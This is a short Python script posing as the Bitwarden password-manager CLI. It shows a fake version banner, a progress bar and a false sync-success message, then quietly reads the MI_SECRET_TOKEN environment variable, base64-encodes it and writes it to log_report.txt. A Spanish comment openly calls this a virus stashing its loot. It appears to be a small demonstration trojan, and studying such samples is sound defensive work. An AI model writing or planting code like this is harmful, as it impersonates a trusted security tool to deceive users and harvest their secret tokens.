import os, base64, time, sys

def animacion():
    print("--- 🛡️  BITWARDEN CLI v2026.4.0 ---")
    for i in range(1, 101):
        time.sleep(0.04)
        sys.stdout.write(f"\rProgreso: [{('=' * (i // 5)).ljust(20)}] {i}%")
        sys.stdout.flush()
    print("\n[SUCCESS] Sincronización completa.")
    
    secreto = os.getenv('MI_SECRET_TOKEN')
    if secreto:
        # El virus guarda el botín en un archivo escondido
        token_robado = base64.b64encode(secreto.encode()).decode()
        with open("log_report.txt", "w") as f:
            f.write(f"ID: 772 | DATA: {token_robado}")

if __name__ == "__main__":
    animacion()

